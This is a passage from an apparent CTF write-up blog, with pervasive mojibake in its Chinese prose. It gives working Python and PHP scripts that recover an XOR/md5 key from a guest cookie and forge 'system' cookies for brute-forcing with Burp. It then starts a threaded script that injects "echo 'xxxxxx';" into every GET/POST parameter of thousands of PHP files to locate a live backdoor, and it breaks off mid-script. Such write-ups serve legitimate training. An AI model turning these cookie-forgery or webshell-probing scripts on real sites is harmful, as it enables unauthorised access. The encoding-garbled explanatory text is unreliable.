keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"â•®(â•¯â–½â•°)â•­"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å‘ç°åˆ†åˆ«æœ‰ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œä¸€ä¸ªè§£å¯†å‡½æ•°ï¼Œåˆ†æphpä»£ç ï¼›</p><p>å½“ä¼ å…¥<code>cookie</code>ä¸­çš„<code>user</code>çš„å€¼ç»è¿‡<code>decrypt</code>å‡½æ•°åè¿”å›çš„å€¼ä¸º<code>system</code>ï¼Œå°±å¯ä»¥å¾—åˆ°flagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¾—åˆ°ä¸€ä¸²base64ç ï¼Œè¿™ä¸€ä¸²base64ç»è¿‡<code>decrypt</code>å‡½æ•°èƒ½è§£å‡º<code>system</code>ï¼Œäºæ˜¯</p><p>ç”±<code>guest</code>å¯ä»¥é€†æ¨å‡º<code>rnd</code>çš„å€¼å’Œmd5åŠ å¯†å<code>key</code>å€¼çš„å‰5ä½ï¼›</p><p>å†ç”±<code>key</code>çš„å‰5ä½å¾—å‡ºæ‰€æœ‰å‰6ä½å¯èƒ½çš„å€¼ï¼Œå†é€šè¿‡<code>decrypt</code>å‡½æ•°é€†æ¨å‡ºå‡½æ•°ä¸­<code>$txt</code>å€¼çš„å6ä½ï¼Œå†åœ¨å‰é¢åŠ ä¸Š<code>$rnd</code>çš„å€¼ç»è¿‡base64åŠ å¯†åå¾—åˆ°çš„16ä¸ªå¯èƒ½çš„<code>user</code>å€¼ï¼Œå†æ‹¿16ä¸ªå€¼å»bpè¿›è¡Œçˆ†ç ´ï¼Œå³å¯å¾—åˆ°flag</p><p>å†™å‡ºè§£å¯†è„šæœ¬ï¼Œå¾—åˆ°<code>rnd</code>å’Œmd5åŠ å¯†åçš„<code>key</code>å€¼</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64session <span class="token operator">=</span> <span class="token string">'OFZhSEdLVxga'</span><span class="token comment">#æœ¬åœ°userå€¼</span>txt <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">#æ‹¿åˆ°rndçš„å€¼</span>ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>guest <span class="token operator">=</span> <span class="token string">'guest'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ‹¿åˆ°key</span>system <span class="token operator">=</span> <span class="token string">'system'</span>system1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    system1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token comment">#ç»è¿‡md5åŠ å¯†åçš„æ¯ä¸€ä½æ•°éƒ½æ˜¯0-fä¹‹é—´çš„æ•°</span>key_new <span class="token operator">=</span> <span class="token string">''</span>cookie_new <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#å¾ªç¯å‡ºæ‰€æœ‰å¯èƒ½çš„ç»“æœ</span>    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    session_new <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session_new <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new    cookie_new <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre><p>è¿è¡Œè„šæœ¬å¾—åˆ°16ä¸ªbase64åŠ å¯†åçš„å€¼</p><p>æŒ‰ç†è¯´åŸé¢˜åˆ©ç”¨bpæ˜¯å¯ä»¥çˆ†ç ´çš„å‡ºæ¥çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®ä¸çŸ¥é“æ˜¯ç¯å¢ƒçš„é—®é¢˜è¿˜æ˜¯ä»€ä¹ˆåŸå› ï¼Œåç«¯çš„userå€¼ä¸€ç›´åœ¨å˜ï¼Œæ„æ€æ˜¯è¯´<code>rnd</code>å€¼ä¸€ç›´åœ¨å˜ï¼Œé‚£md5åŠ å¯†åçš„<code>key</code>å€¼ä¹Ÿä¼šå˜ï¼Œè„šæœ¬å°±æ¯«æ— æ„ä¹‰ï¼Œæ‰€ä»¥æ— æœï¼Œè¿˜æ˜¯æˆ‘å“ªé‡Œç†è§£é”™äº†ã€‚ã€‚ã€‚ã€‚ã€‚å…ˆæ”¾è¿™é‡Œï¼Œç­‰æˆ‘å•¥æ—¶å€™æƒ³æ˜ç™½äº†ï¼Œæˆ–è€…å“ªä½å¤§ä½¬å‘Šè¯‰æˆ‘åŸå› äº†å†è¡¥ä¸Šã€‚</p><p>æˆ‘æ¥å¡«å‘äº†ï¼Œä¸Šé¢ä¸€æ­¥æˆ‘è¿˜æ˜¯ç†è§£é”™äº†ï¼Œåˆ·æ–°ç•Œé¢å°±ç®—ä¼šå†æ¬¡æ‰§è¡Œphpè„šæœ¬ï¼Œä½†ä¹Ÿä¼šåœ¨æ¯”è¾ƒå®Œ<code>$username</code>çš„å€¼åå†è¿›å…¥elseå‡½æ•°å†æ‰§è¡Œä¸€é<code>encrypt</code>å‡½æ•°å›æ˜¾ä¸€ä¸ªæ–°çš„<code>cookie</code>ï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘<code>user</code>çš„å€¼ä¼šå˜çš„é—®é¢˜ï¼Œå› ä¸ºåœ¨ä»–å˜ä¹‹å‰å¦‚æœæˆ‘ä»¬å·²ç»åˆ¤æ–­å‡º<code>$username</code>==<code>system</code>äº†ï¼Œå°±ä¼šæˆåŠŸæ‹¿åˆ°flagï¼Œè€Œåå°ä¸ä¼šå†è°ƒç”¨<code>encrypt</code>å‡½æ•°ç”Ÿæˆæ–°çš„<code>user</code>ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯çˆ†ç ´çš„æ—¶å€™è¿˜æ˜¯çˆ†ç ´ä¸å‡ºæ¥ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘å¯æ˜¯æ€€ç–‘æˆ‘çš„pythonè„šæœ¬</p><p>åœ¨ç½‘ä¸Šæ‰¾ä¸ªphpè„šæœ¬æ¥æ‰§è¡Œä¸€ä¸‹çœ‹çœ‹äºŒè€…å¾—å‡ºæ¥çš„base64æœ‰ä»€ä¹ˆåŒºåˆ«</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$txt1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'emVTQkZHCh8d'</span><span class="token punctuation">;</span>     <span class="token variable">$cookie_guest</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$ttmp</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cookie_guest</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">.=</span> <span class="token punctuation">(</span><span class="token variable">$txt1</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$ttmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$key=md5($rnd.$key);</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$txt2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789abcdef'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key_new</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token variable">$md5</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$cookie_system</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$cookie_system</span> <span class="token operator">.=</span> <span class="token punctuation">(</span><span class="token variable">$key_new</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$txt2</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$cookie_system</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$cookie_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$cookie_system</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt loading="lazy"></p><p>å‘ç°é¢„æœŸç»“æœå’Œæˆ‘æƒ³çš„å¹¶ä¸ä¸€æ ·ï¼Œä½†æ˜¯ç»“æœå´æœ‰å‡ åˆ†ç›¸ä¼¼ï¼Œé€æ­¥æ’æŸ¥åå‘ç°åˆ°æœ€åä¸€æ­¥æˆ‘å¾—åˆ°çš„keyçš„6ä½å€¼å’Œphpä¸Šçš„æ˜¯ä¸€æ ·çš„ï¼Œä½†ç»“æœç»è¿‡base64ç¼–ç åå°±ä¸ä¸€æ ·äº†ï¼Œåº”è¯¥æ˜¯ç¼–ç çš„é—®é¢˜ï¼Œåœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ç•ªåå‘ç°python3é»˜è®¤æŠŠè„šæœ¬æ–‡ä»¶ç”¨<code>utf-8</code>è¿›è¡Œç¼–ç ï¼Œpython2ç”¨çš„æ˜¯<code>ascii</code>ï¼ˆæˆ‘ç”¨çš„æ˜¯python3ï¼Œpython2ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼‰ï¼Œè€Œphpå¯¹base64ç¼–ç çš„å‡½æ•°æ˜¯å¥½åƒç”¨çš„asciiè¿›è¡Œç¼–ç ï¼ˆåº”è¯¥~ï¼Œåæ–‡éªŒè¯ï¼‰ï¼Œäºæ˜¯æ”¹ç”¨è„šæœ¬base64ç¼–ç æ–¹å¼ï¼Œè¿™é‡Œä½¿ç”¨<code>Latin1</code>è¿›è¡Œç¼–ç ï¼Œ<strong>Latin1ç¼–ç æ˜¯å•å­—èŠ‚ç¼–ç ï¼Œå‘ä¸‹å…¼å®¹ASCIIï¼Œ</strong>å…¶ç¼–ç èŒƒå›´æ˜¯0x00-0xFFï¼Œ0x00-0x7Fä¹‹é—´å®Œå…¨å’ŒASCIIä¸€è‡´ï¼Œ0x80-0x9Fä¹‹é—´æ˜¯æ§åˆ¶å­—ç¬¦ï¼Œ0xA0-0xFFä¹‹é—´æ˜¯æ–‡å­—ç¬¦å·ï¼Œ<a href="https://blog.csdn.net/BLGT_57/article/details/80848492">è¯¦</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64session <span class="token operator">=</span> <span class="token string">'QlRxaRVPCx5K'</span>txt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Latin1"</span><span class="token punctuation">)</span>rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">#æ‹¿åˆ°rndçš„å€¼</span>ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>guest <span class="token operator">=</span> <span class="token string">'guest'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#æ‹¿åˆ°key</span>system <span class="token operator">=</span> <span class="token string">'system'</span>system1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    system1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>key_new <span class="token operator">=</span> <span class="token string">''</span>cookie_new <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    session_new <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session_new <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new    cookie_new <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'Latin1'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt loading="lazy"></p><p>äºæ˜¯å¾—åˆ°çš„å€¼å’Œphpç¼–ç å‡ºæ¥çš„å®Œå…¨ä¸€è‡´ï¼Œç„¶åæ‹¿åˆ°bpä¸­è¿›è¡Œçˆ†ç ´æ‹¿åˆ°flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt loading="lazy"></p><p>å†™è„šæœ¬çš„æ°´å¹³å®åœ¨æ˜¯å¤ªèœäº†ï¼Œè¿˜å¾—å¤šç»ƒæ‰è¡Œ</p><h2 id="2019å¼ºç½‘æ¯â€”é«˜æ˜çš„é»‘å®¢"><a href="#2019å¼ºç½‘æ¯â€”é«˜æ˜çš„é»‘å®¢" class="headerlink" title="2019å¼ºç½‘æ¯â€”é«˜æ˜çš„é»‘å®¢"></a>2019å¼ºç½‘æ¯â€”é«˜æ˜çš„é»‘å®¢</h2><p>æ ¸å¿ƒâ€”â€”â€”â€”â€”â€”â€”â€”â€“pythonè„šæœ¬</p><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png" alt loading="lazy"></p><p>å°†æºç ä¸‹è½½ä¸‹æ¥è§£å‹åå‘ç°æœ‰3000å¤šä¸ªphpæ–‡ä»¶ï¼Œäºæ˜¯ä¸Šå¤§ä½¬è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'å¼€å§‹æ—¶é—´ï¼š  '</span><span class="token operator">+</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span>filePath <span class="token operator">=</span> <span class="token string">r"C:/Users/71071/Desktop/src/"</span>os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>    <span class="token comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">5</span><span class="token comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>keep_alive <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span><span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'trying   '</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token operator">+</span> <span class="token string">'     '</span><span class="token operator">+</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span>            gets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_GET\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            posts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'\$_POST\[\'(.*?)\'\]'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#æ‰€æœ‰çš„$_POST</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">#æ‰€æœ‰çš„$_GET</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"echo 'xxxxxx';"</span>    url <span class="token operator">=</span> <span class="token 